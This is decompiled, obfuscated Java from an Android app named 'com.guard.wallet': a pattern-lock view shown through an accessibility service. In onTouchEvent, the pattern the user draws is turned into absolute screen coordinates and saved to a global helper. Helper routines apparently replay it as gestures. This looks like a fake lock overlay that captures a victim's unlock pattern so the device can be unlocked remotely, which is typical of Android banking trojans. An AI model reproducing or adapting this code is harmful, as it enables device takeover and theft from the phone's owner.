package o0;

import a1.q;
import android.animation.ValueAnimator;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.Path;
import android.graphics.Rect;
import android.graphics.Paint.Cap;
import android.graphics.Paint.Join;
import android.graphics.Paint.Style;
import android.os.Handler;
import android.os.Looper;
import android.os.Parcelable;
import android.os.SystemClock;
import android.os.Build.VERSION;
import android.support.annotation.ColorInt;
import android.support.annotation.Dimension;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.view.View.MeasureSpec;
import android.view.accessibility.AccessibilityManager;
import android.view.animation.AnimationUtils;
import android.view.animation.Interpolator;
import com.guard.wallet.entity.Point;
import com.guard.wallet.helper.o;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.k;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.concurrent.locks.ReentrantLock;

public final class h extends View {
   public static int K;
   public boolean A;
   public boolean B;
   public boolean C;
   public float D;
   public float E;
   public final Path F;
   public final Rect G;
   public final Rect H;
   public Interpolator I;
   public Interpolator J;
   public f[][] a;
   public int b;
   public long c;
   public final float d = 0.6F;
   public boolean e;
   public int f;
   public int g;
   public int h;
   public int i;
   public int j;
   public int k;
   public int l;
   public int m;
   public int n;
   public int o;
   public int p;
   public e q;
   public Paint r;
   public Paint s;
   public final ArrayList t;
   public ArrayList u;
   public boolean[][] v;
   public float w = -1.0F;
   public float x = -1.0F;
   public int y = 0;
   public boolean z = true;

   public h(MyAccessibilityService var1) {
      super(var1, null);
      this.A = false;
      this.B = true;
      this.C = false;
      this.F = new Path();
      this.G = new Rect();
      this.H = new Rect();
      K = 3;
      this.e = false;
      this.f = 1;
      this.k = 3;
      this.j = -1;
      this.g = -1;
      this.i = -1;
      this.h = Color.parseColor("#f4511e");
      this.q = o0.e.h;
      this.l = 10;
      this.m = 24;
      this.n = -1;
      this.o = 190;
      this.p = 100;
      int var2 = K;
      this.b = var2 * var2;
      this.u = new ArrayList(this.b);
      var2 = K;
      this.v = new boolean[var2][var2];
      var2 = K;
      this.a = new f[var2][var2];

      for (int var7 = 0; var7 < K; var7++) {
         for (int var3 = 0; var3 < K; var3++) {
            f[][] var4 = this.a;
            var4[var7][var3] = new f();
            var4[var7][var3].a = (float)this.l;
         }
      }

      this.t = new ArrayList();
      this.g();
   }

   private int getCurrentPathColor() {
      if (!this.A && !this.C) {
         int var1 = this.y;
         if (var1 == 2) {
            return this.h;
         } else if (var1 != 0 && var1 != 1) {
            StringBuilder var2 = new StringBuilder("Unknown view mode ");
            var2.append(this.y);
            throw new IllegalStateException(var2.toString());
         } else {
            return this.i;
         }
      } else {
         return this.j;
      }
   }

   public final void a(d var1) {
      boolean[][] var8 = this.v;
      int var6 = var1.a;
      boolean[] var14 = var8[var6];
      int var7 = var1.b;
      var14[var7] = true;
      this.u.add(var1);
      if (!this.A) {
         f var12 = this.a[var6][var7];
         this.j((float)this.l, (float)this.m, (long)this.o, this.J, var12, new o.d(this, var12, 11));
         float var2 = this.w;
         float var5 = this.x;
         float var4 = this.e(var7);
         float var3 = this.f(var6);
         ValueAnimator var15 = ValueAnimator.ofFloat(new float[]{0.0F, 1.0F});
         var15.addUpdateListener(new a(this, var12, var2, var4, var5, var3));
         var15.addListener(new b(this, var12, 0));
         var15.setInterpolator(this.I);
         var15.setDuration((long)this.p);
         var15.start();
         var12.e = var15;
      }

      this.announceForAccessibility("Dot added to pattern");
      ArrayList var10 = this.u;

      for (i var13 : this.t) {
         if (var13 != null) {
            String var16 = i.class.getName();
            StringBuilder var9 = new StringBuilder("Pattern progress: ");
            var9.append(com.guard.wallet.utils.g.E0(var13.a, var10));
            Log.d(var16, var9.toString());
         }
      }
   }

   public final void b() {
      for (int var1 = 0; var1 < K; var1++) {
         for (int var2 = 0; var2 < K; var2++) {
            this.v[var1][var2] = false;
         }
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void c() {
      ArrayList var1 = this.t;

      Exception var10000;
      label46: {
         try {
            if (!var1.isEmpty()) {
               var1.clear();
            }
         } catch (Exception var5) {
            var10000 = var5;
            boolean var10001 = false;
            break label46;
         }

         try {
            if (!this.u.isEmpty()) {
               this.u.clear();
            }
         } catch (Exception var4) {
            var10000 = var4;
            boolean var8 = false;
            break label46;
         }

         try {
            this.s = null;
            this.r = null;
            var6 = this.F;
         } catch (Exception var3) {
            var10000 = var3;
            boolean var9 = false;
            break label46;
         }

         if (var6 == null) {
            return;
         }

         try {
            var6.close();
            return;
         } catch (Exception var2) {
            var10000 = var2;
            boolean var10 = false;
         }
      }

      Exception var7 = var10000;
      a1.q.s("o0.h", var7);
   }

   public final d d(float var1, float var2) {
      float var5 = this.E;
      float var3 = this.d;
      float var7 = var3 * var5;
      float var4 = (float)this.getPaddingTop();
      float var8 = (var5 - var7) / 2.0F;
      int var12 = 0;
      int var9 = 0;

      byte var11;
      int var27;
      while (true) {
         var27 = K;
         var11 = -1;
         if (var9 >= var27) {
            var27 = -1;
            break;
         }

         float var6 = (float)var9 * var5 + var8 + var4;
         if (var2 >= var6 && var2 <= var6 + var7) {
            var27 = var9;
            break;
         }

         var9++;
      }

      d var15;
      d var16;
      label78: {
         var16 = null;
         if (var27 >= 0) {
            var2 = this.D;
            var5 = var3 * var2;
            var3 = (float)this.getPaddingLeft();
            float var22 = (var2 - var5) / 2.0F;
            var9 = var12;

            while (true) {
               if (var9 >= K) {
                  var9 = -1;
                  break;
               }

               var4 = (float)var9 * var2 + var22 + var3;
               if (var1 >= var4 && var1 <= var4 + var5) {
                  break;
               }

               var9++;
            }

            if (var9 >= 0 && !this.v[var27][var9]) {
               var15 = o0.d.b(var27, var9);
               break label78;
            }
         }

         var15 = null;
      }

      if (var15 != null) {
         ArrayList var17 = this.u;
         if (!var17.isEmpty()) {
            var16 = (d)var17.get(var17.size() - 1);
            var27 = var16.a;
            int var13 = var15.a - var27;
            var9 = var15.b;
            var12 = var16.b;
            int var14 = var9 - var12;
            var9 = var27;
            if (Math.abs(var13) == 2) {
               var9 = var27;
               if (Math.abs(var14) != 1) {
                  byte var26;
                  if (var13 > 0) {
                     var26 = 1;
                  } else {
                     var26 = -1;
                  }

                  var9 = var26 + var16.a;
               }
            }

            var27 = var12;
            if (Math.abs(var14) == 2) {
               var27 = var12;
               if (Math.abs(var13) != 1) {
                  byte var30 = var11;
                  if (var14 > 0) {
                     var30 = 1;
                  }

                  var27 = var12 + var30;
               }
            }

            var16 = o0.d.b(var9, var27);
         }

         if (var16 != null && !this.v[var16.a][var16.b]) {
            this.a(var16);
         }

         this.a(var15);
         if (this.B) {
            this.performHapticFeedback(1, 3);
         }

         return var15;
      } else {
         return null;
      }
   }

   public final float e(int var1) {
      float var4 = (float)this.getPaddingLeft();
      float var3 = (float)var1;
      float var2 = this.D;
      return var2 / 2.0F + var3 * var2 + var4;
   }

   public final float f(int var1) {
      e var6 = this.q;
      if (var6 == o0.e.a) {
         float var20 = (float)this.getPaddingTop();
         return (float)var1 * this.E + var20 - (float)this.l / 2.0F;
      } else if (var6 == o0.e.b) {
         float var19 = (float)this.getPaddingTop();
         return (float)var1 * this.E + var19;
      } else {
         float var9;
         if (var6 == o0.e.c) {
            var9 = (float)this.getPaddingTop();
            var9 = (float)var1 * this.E + var9;
            var1 = this.l;
         } else {
            if (var6 == o0.e.d) {
               var9 = (float)this.getPaddingTop();
               return (float)var1 * this.E + var9 + (float)this.l;
            }

            if (var6 == o0.e.e) {
               var9 = (float)this.getPaddingTop();
               var9 = (float)var1 * this.E + var9;
               var1 = this.l;
            } else {
               if (var6 == o0.e.f) {
                  var9 = (float)this.getPaddingTop();
                  float var24 = (float)var1;
                  float var28 = this.E;
                  var1 = this.l;
                  return var24 * var28 + var9 + (float)var1 + (float)var1;
               }

               if (var6 != o0.e.g) {
                  if (var6 == o0.e.h) {
                     var9 = (float)this.getPaddingTop();
                     float var27 = (float)var1;
                     float var23 = this.E;
                     return var23 / 2.0F + var27 * var23 + var9;
                  }

                  if (var6 == o0.e.i) {
                     float var22 = (float)this.getPaddingTop();
                     float var26 = (float)var1;
                     var9 = this.E;
                     return var9 / 2.0F + var26 * var9 + var22 - (float)this.l / 2.0F;
                  }

                  if (var6 == o0.e.j) {
                     float var21 = (float)this.getPaddingTop();
                     float var5 = (float)var1;
                     var9 = this.E;
                     float var25 = var9 / 2.0F;
                     return (float)this.l / 2.0F + var25 + var5 * var9 + var21;
                  }

                  var9 = (float)this.getPaddingTop();
                  return (float)(var1 + 2) * this.E + var9 - (float)this.l / 2.0F;
               }

               float var3 = (float)this.getPaddingTop();
               float var4 = (float)var1;
               var9 = this.E;
               var1 = this.l;
               var9 = var4 * var9 + var3 + (float)var1;
            }

            var9 += (float)var1;
         }

         return (float)var1 / 2.0F + var9;
      }
   }

   public final void g() {
      this.setClickable(true);
      Paint var1 = new Paint();
      this.s = var1;
      var1.setAntiAlias(true);
      this.s.setDither(true);
      this.s.setColor(this.j);
      this.s.setStyle(Style.STROKE);
      this.s.setStrokeJoin(Join.ROUND);
      this.s.setStrokeCap(Cap.ROUND);
      this.s.setStrokeWidth((float)this.k);
      if (VERSION.SDK_INT >= 29) {
         a0.d.p(this.s, a0.d.d());
      }

      var1 = new Paint();
      this.r = var1;
      var1.setAntiAlias(true);
      this.r.setDither(true);
      if (!this.isInEditMode()) {
         this.I = AnimationUtils.loadInterpolator(this.getContext(), 17563661);
         this.J = AnimationUtils.loadInterpolator(this.getContext(), 17563662);
      }
   }

   public int getAspectRatio() {
      return this.f;
   }

   public int getCorrectStateColor() {
      return this.i;
   }

   public int getDotAnimationDuration() {
      return this.o;
   }

   public int getDotCount() {
      return K;
   }

   public int getDotNormalSize() {
      return this.l;
   }

   public int getDotSelectedColor() {
      return this.n;
   }

   public int getDotSelectedSize() {
      return this.m;
   }

   public int getNormalStateColor() {
      return this.g;
   }

   public int getPathColor() {
      return this.j;
   }

   public int getPathEndAnimationDuration() {
      return this.p;
   }

   public int getPathWidth() {
      return this.k;
   }

   public List<d> getPattern() {
      return (List<d>)this.u.clone();
   }

   public int getPatternSize() {
      return this.b;
   }

   public int getPatternViewMode() {
      return this.y;
   }

   public int getWrongStateColor() {
      return this.h;
   }

   public final void h() {
      this.announceForAccessibility("Pattern cleared");
      Iterator var1 = this.t.iterator();

      while (var1.hasNext()) {
         if ((i)var1.next() != null) {
            Log.d(i.class.getName(), "Pattern has been cleared");
         }
      }
   }

   public final void i() {
      this.announceForAccessibility("Pattern drawing started");
      Iterator var1 = this.t.iterator();

      while (var1.hasNext()) {
         if ((i)var1.next() != null) {
            Log.d(i.class.getName(), "Pattern drawing started");
         }
      }
   }

   public final void j(float var1, float var2, long var3, Interpolator var5, f var6, o.d var7) {
      ValueAnimator var8 = ValueAnimator.ofFloat(new float[]{var1, var2});
      var8.addUpdateListener(new c(this, var6));
      if (var7 != null) {
         var8.addListener(new b(this, var7, 1));
      }

      var8.setInterpolator(var5);
      var8.setDuration(var3);
      var8.start();
   }

   public final void onDraw(Canvas var1) {
      ArrayList var14 = this.u;
      int var10 = var14.size();
      boolean[][] var13 = this.v;
      if (this.y == 1) {
         int var8 = (int)(SystemClock.elapsedRealtime() - this.c) % ((var10 + 1) * 700);
         int var9 = var8 / 700;
         this.b();

         for (int var7 = 0; var7 < var9; var7++) {
            d var15 = (d)var14.get(var7);
            var13[var15.a][var15.b] = true;
         }

         boolean var32;
         if (var9 > 0 && var9 < var10) {
            var32 = true;
         } else {
            var32 = false;
         }

         if (var32) {
            float var4 = (float)(var8 % 700) / 700.0F;
            d var42 = (d)var14.get(var9 - 1);
            float var2 = this.e(var42.b);
            float var6 = this.f(var42.a);
            var42 = (d)var14.get(var9);
            float var5 = this.e(var42.b);
            float var3 = this.f(var42.a);
            this.w = var2 + (var5 - var2) * var4;
            this.x = var6 + (var3 - var6) * var4;
         }

         this.invalidate();
      }

      Path var44 = this.F;
      var44.rewind();

      for (int var36 = 0; var36 < K; var36++) {
         float var19 = this.f(var36);

         for (int var39 = 0; var39 < K; var39++) {
            f var16 = this.a[var36][var39];
            float var27 = this.e(var39);
            float var23 = var16.a;
            boolean var12 = var13[var36][var39];
            boolean var11 = var16.b;
            Paint var45 = this.r;
            int var33;
            if (var12 && !this.A && !this.C) {
               var33 = this.y;
               if (var33 == 2) {
                  var33 = this.h;
               } else {
                  if (var33 != 0 && var33 != 1) {
                     StringBuilder var18 = new StringBuilder("Unknown view mode ");
                     var18.append(this.y);
                     throw new IllegalStateException(var18.toString());
                  }

                  var33 = this.i;
               }
            } else if (var11) {
               var33 = this.n;
            } else {
               var33 = this.g;
            }

            var45.setColor(var33);
            this.r.setAlpha((int)255.0F);
            var1.drawCircle(var27, var19 + 0.0F, var23 * 1.0F / 2.0F, this.r);
         }
      }

      if (this.A ^ true) {
         this.s.setColor(this.getCurrentPathColor());
         int var35 = 0;
         float var24 = 0.0F;
         float var20 = 0.0F;
         int var37 = 0;

         while (var35 < var10) {
            d var46 = (d)var14.get(var35);
            boolean[] var17 = var13[var46.a];
            int var40 = var46.b;
            if (!var17[var40]) {
               break;
            }

            float var30 = this.e(var40);
            var37 = var46.a;
            float var28 = this.f(var37);
            if (var35 != 0) {
               label68: {
                  f var47 = this.a[var37][var40];
                  var44.rewind();
                  var44.moveTo(var24, var20);
                  var20 = var47.c;
                  if (var20 != Float.MIN_VALUE) {
                     var24 = var47.d;
                     if (var24 != Float.MIN_VALUE) {
                        var44.lineTo(var20, var24);
                        break label68;
                     }
                  }

                  var44.lineTo(var30, var28);
               }

               var1.drawPath(var44, this.s);
            }

            var35++;
            var37 = 1;
            var24 = var30;
            var20 = var28;
         }

         if ((this.C || this.y == 1) && var37) {
            var44.rewind();
            var44.moveTo(var24, var20);
            var44.lineTo(this.w, this.x);
            Paint var41 = this.s;
            float var31 = this.w;
            float var29 = this.x;
            var24 = var31 - var24;
            var20 = var29 - var20;
            var41.setAlpha((int)(Math.min(1.0F, Math.max(0.0F, ((float)Math.sqrt((double)(var20 * var20 + var24 * var24)) / this.D - 0.3F) * 4.0F)) * 255.0F));
            var1.drawPath(var44, this.s);
         }
      }
   }

   public final boolean onHoverEvent(MotionEvent var1) {
      if (((AccessibilityManager)this.getContext().getSystemService("accessibility")).isTouchExplorationEnabled()) {
         int var3;
         label20: {
            var3 = var1.getAction();
            byte var2;
            if (var3 != 7) {
               if (var3 != 9) {
                  if (var3 != 10) {
                     break label20;
                  }

                  var2 = 1;
               } else {
                  var2 = 0;
               }
            } else {
               var2 = 2;
            }

            var1.setAction(var2);
         }

         this.onTouchEvent(var1);
         var1.setAction(var3);
      }

      return super.onHoverEvent(var1);
   }

   public final void onMeasure(int var1, int var2) {
      super.onMeasure(var1, var2);
      if (this.e) {
         int var4 = this.getSuggestedMinimumWidth();
         int var3 = MeasureSpec.getSize(var1);
         int var5 = MeasureSpec.getMode(var1);
         if (var5 != Integer.MIN_VALUE) {
            var1 = var4;
            if (var5 != 0) {
               var1 = var3;
            }
         } else {
            var1 = Math.max(var3, var4);
         }

         var4 = this.getSuggestedMinimumHeight();
         var3 = MeasureSpec.getSize(var2);
         var5 = MeasureSpec.getMode(var2);
         if (var5 != Integer.MIN_VALUE) {
            var2 = var4;
            if (var5 != 0) {
               var2 = var3;
            }
         } else {
            var2 = Math.max(var3, var4);
         }

         var3 = this.f;
         if (var3 != 0) {
            if (var3 != 1) {
               if (var3 != 2) {
                  throw new IllegalStateException("Unknown aspect ratio");
               }

               var1 = Math.min(var1, var2);
            } else {
               var2 = Math.min(var1, var2);
            }
         } else {
            var1 = Math.min(var1, var2);
            var2 = var1;
         }

         this.setMeasuredDimension(var1, var2);
      }
   }

   public final void onRestoreInstanceState(Parcelable var1) {
      g var6 = (g)var1;
      super.onRestoreInstanceState(var6.getSuperState());
      ArrayList var5 = new ArrayList();
      int var2 = 0;

      while (true) {
         String var4 = var6.a;
         if (var2 >= var4.length()) {
            this.u.clear();
            this.u.addAll(var5);
            this.b();

            for (d var8 : var5) {
               this.v[var8.a][var8.b] = true;
            }

            this.setViewMode(0);
            this.y = var6.b;
            this.z = var6.c;
            this.A = var6.d;
            this.B = var6.e;
            return;
         }

         int var3 = Character.getNumericValue(var4.charAt(var2));
         var5.add(o0.d.b(var3 / this.getDotCount(), var3 % this.getDotCount()));
         var2++;
      }
   }

   public final Parcelable onSaveInstanceState() {
      return new g(super.onSaveInstanceState(), com.guard.wallet.utils.g.E0(this, this.u), this.y, this.z, this.A, this.B);
   }

   public final void onSizeChanged(int var1, int var2, int var3, int var4) {
      this.D = (float)(var1 - this.getPaddingLeft() - this.getPaddingRight()) / (float)K;
      this.E = (float)(var2 - this.getPaddingTop() - this.getPaddingBottom()) / (float)K;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final boolean onTouchEvent(MotionEvent var1) {
      boolean var16 = this.z;
      int var12 = 0;
      if (var16 && this.isEnabled()) {
         int var13 = var1.getAction();
         if (var13 == 0) {
            this.u.clear();
            this.b();
            this.y = 0;
            this.invalidate();
            float var42 = var1.getX();
            float var39 = var1.getY();
            d var37 = this.d(var42, var39);
            if (var37 != null) {
               this.C = true;
               this.y = 0;
               this.i();
            } else {
               this.C = false;
               this.h();
            }

            if (var37 != null) {
               float var51 = this.e(var37.b);
               float var46 = this.f(var37.a);
               float var50 = this.D / 2.0F;
               float var52 = this.E / 2.0F;
               this.invalidate((int)(var51 - var50), (int)(var46 - var52), (int)(var51 + var50), (int)(var46 + var52));
            }

            this.w = var42;
            this.x = var39;
            return true;
         } else if (var13 != 1) {
            if (var13 != 2) {
               if (var13 != 3) {
                  return false;
               } else {
                  this.C = false;
                  this.u.clear();
                  this.b();
                  this.y = 0;
                  this.invalidate();
                  this.h();
                  return true;
               }
            } else {
               float var10 = (float)this.k;
               int var14 = var1.getHistorySize();
               Rect var57 = this.H;
               var57.setEmpty();

               for (var55 = false; var12 < var14 + 1; var12++) {
                  float var3;
                  if (var12 < var14) {
                     var3 = var1.getHistoricalX(var12);
                  } else {
                     var3 = var1.getX();
                  }

                  float var2;
                  if (var12 < var14) {
                     var2 = var1.getHistoricalY(var12);
                  } else {
                     var2 = var1.getY();
                  }

                  d var58 = this.d(var3, var2);
                  int var15 = this.u.size();
                  if (var58 != null && var15 == 1) {
                     this.C = true;
                     this.i();
                  }

                  float var4 = Math.abs(var3 - this.w);
                  float var5 = Math.abs(var2 - this.x);
                  if (var4 > 0.0F || var5 > 0.0F) {
                     var55 = true;
                  }

                  if (this.C && var15 > 0) {
                     d var59 = (d)this.u.get(var15 - 1);
                     var5 = this.e(var59.b);
                     var4 = this.f(var59.a);
                     float var7 = Math.min(var5, var3) - var10;
                     float var8 = Math.max(var5, var3) + var10;
                     float var6 = Math.min(var4, var2) - var10;
                     float var9 = Math.max(var4, var2) + var10;
                     var5 = var8;
                     var4 = var9;
                     var3 = var6;
                     var2 = var7;
                     if (var58 != null) {
                        var3 = this.D * 0.5F;
                        float var11 = this.E * 0.5F;
                        var5 = this.e(var58.b);
                        var4 = this.f(var58.a);
                        var2 = Math.min(var5 - var3, var7);
                        var5 = Math.max(var5 + var3, var8);
                        var3 = Math.min(var4 - var11, var6);
                        var4 = Math.max(var4 + var11, var9);
                     }

                     var57.union(Math.round(var2), Math.round(var3), Math.round(var5), Math.round(var4));
                  }
               }

               this.w = var1.getX();
               this.x = var1.getY();
               if (var55) {
                  Rect var36 = this.G;
                  var36.union(var57);
                  this.invalidate(var36);
                  var36.set(var57);
               }

               return true;
            }
         } else {
            if (!this.u.isEmpty()) {
               this.C = false;

               for (int var53 = 0; var53 < K; var53++) {
                  for (int var54 = 0; var54 < K; var54++) {
                     f var17 = this.a[var53][var54];
                     ValueAnimator var27 = var17.e;
                     if (var27 != null) {
                        var27.cancel();
                        var17.c = Float.MIN_VALUE;
                        var17.d = Float.MIN_VALUE;
                     }
                  }
               }

               this.announceForAccessibility("Pattern drawing completed");
               ArrayList var18 = this.u;

               for (i var28 : this.t) {
                  if (var28 != null) {
                     ReentrantLock var19 = var28.b;
                     if (var19.tryLock()) {
                        Log.d(i.class.getName(), "Pattern complete: ");
                        h var21 = var28.a;
                        if (var21 != null) {
                           LinkedList var20 = new LinkedList();
                           if (var18 != null && !var18.isEmpty()) {
                              for (d var23 : var18) {
                                 Point var30;
                                 if (var23 != null) {
                                    int[] var29 = new int[2];
                                    var21.getLocationOnScreen(var29);
                                    Log.d("getCenterForDot X:", String.valueOf(var29[0]));
                                    Log.d("getCenterForDot Y:", String.valueOf(var29[1]));
                                    var30 = new Point(var21.e(var23.b) + (float)var29[0], var21.f(var23.a) + (float)var29[1]);
                                 } else {
                                    var30 = null;
                                 }

                                 if (var30 != null) {
                                    var20.add(var30);
                                 }
                              }
                           }

                           com.guard.wallet.plug.d var31 = com.guard.wallet.helper.o.b;
                           var31.getClass();
                           if (!var20.isEmpty()) {
                              LinkedList var32 = var31.a;
                              var32.clear();
                              var32.addAll(var20);
                           }

                           var21.u.clear();
                           var21.b();
                           var21.y = 0;
                           var21.invalidate();

                           label161: {
                              Exception var10000;
                              label207: {
                                 ReentrantLock var61;
                                 label158: {
                                    try {
                                       var61 = com.guard.wallet.helper.o.c;
                                       if (!var61.tryLock()) {
                                          break label161;
                                       }

                                       if (com.guard.wallet.utils.k.a()) {
                                          com.guard.wallet.helper.o.e();
                                          break label158;
                                       }
                                    } catch (Exception var26) {
                                       var10000 = var26;
                                       boolean var10001 = false;
                                       break label207;
                                    }

                                    try {
                                       Handler var60 = new Handler(Looper.getMainLooper());
                                       com.guard.wallet.helper.f var33 = new com.guard.wallet.helper.f(2);
                                       var60.post(var33);
                                    } catch (Exception var25) {
                                       var10000 = var25;
                                       boolean var62 = false;
                                       break label207;
                                    }
                                 }

                                 try {
                                    var61.unlock();
                                    break label161;
                                 } catch (Exception var24) {
                                    var10000 = var24;
                                    boolean var63 = false;
                                 }
                              }

                              Exception var34 = var10000;
                              a1.q.s("com.guard.wallet.helper.o", var34);
                           }

                           if (com.guard.wallet.helper.o.i() ^ true) {
                              com.guard.wallet.utils.g.T0(5);
                              Point[] var35 = new Point[var20.size()];
                              var20.toArray(var35);
                              if (com.guard.wallet.utils.g.S(10L, 800L, var35)) {
                                 com.guard.wallet.utils.g.T0(5);
                              }
                           }
                        }

                        var19.unlock();
                     }
                  }
               }

               this.invalidate();
            }

            return true;
         }
      } else {
         return false;
      }
   }

   public void setAspectRatio(int var1) {
      this.f = var1;
      this.requestLayout();
   }

   public void setAspectRatioEnabled(boolean var1) {
      this.e = var1;
      this.requestLayout();
   }

   public void setCorrectStateColor(@ColorInt int var1) {
      this.i = var1;
   }

   public void setDotAlign(e var1) {
      this.q = var1;
      this.invalidate();
   }

   public void setDotAnimationDuration(int var1) {
      this.o = var1;
      this.invalidate();
   }

   public void setDotCount(int var1) {
      K = var1;
      this.b = var1 * var1;
      this.u = new ArrayList(this.b);
      var1 = K;
      this.v = new boolean[var1][var1];
      var1 = K;
      this.a = new f[var1][var1];

      for (int var6 = 0; var6 < K; var6++) {
         for (int var2 = 0; var2 < K; var2++) {
            f[][] var3 = this.a;
            var3[var6][var2] = new f();
            var3[var6][var2].a = (float)this.l;
         }
      }

      this.requestLayout();
      this.invalidate();
   }

   public void setDotNormalSize(@Dimension int var1) {
      this.l = var1;

      for (int var4 = 0; var4 < K; var4++) {
         for (int var2 = 0; var2 < K; var2++) {
            f[][] var3 = this.a;
            var3[var4][var2] = new f();
            var3[var4][var2].a = (float)this.l;
         }
      }

      this.invalidate();
   }

   public void setDotSelectedColor(int var1) {
      this.n = var1;
   }

   public void setDotSelectedSize(@Dimension int var1) {
      this.m = var1;
   }

   public void setEnableHapticFeedback(boolean var1) {
      this.B = var1;
   }

   public void setInStealthMode(boolean var1) {
      this.A = var1;
   }

   public void setInputEnabled(boolean var1) {
      this.z = var1;
   }

   public void setNormalStateColor(@ColorInt int var1) {
      this.g = var1;
   }

   public void setPathColor(int var1) {
      this.j = var1;
      this.g();
      this.invalidate();
   }

   public void setPathEndAnimationDuration(int var1) {
      this.p = var1;
   }

   public void setPathWidth(@Dimension int var1) {
      this.k = var1;
      this.g();
      this.invalidate();
   }

   public void setTactileFeedbackEnabled(boolean var1) {
      this.B = var1;
   }

   public void setViewMode(int var1) {
      this.y = var1;
      if (var1 == 1) {
         if (this.u.size() == 0) {
            throw new IllegalStateException("you must have a pattern to animate if you want to set the display mode to animate");
         }

         this.c = SystemClock.elapsedRealtime();
         d var2 = (d)this.u.get(0);
         this.w = this.e(var2.b);
         this.x = this.f(var2.a);
         this.b();
      }

      this.invalidate();
   }

   public void setWrongStateColor(@ColorInt int var1) {
      this.h = var1;
   }
}
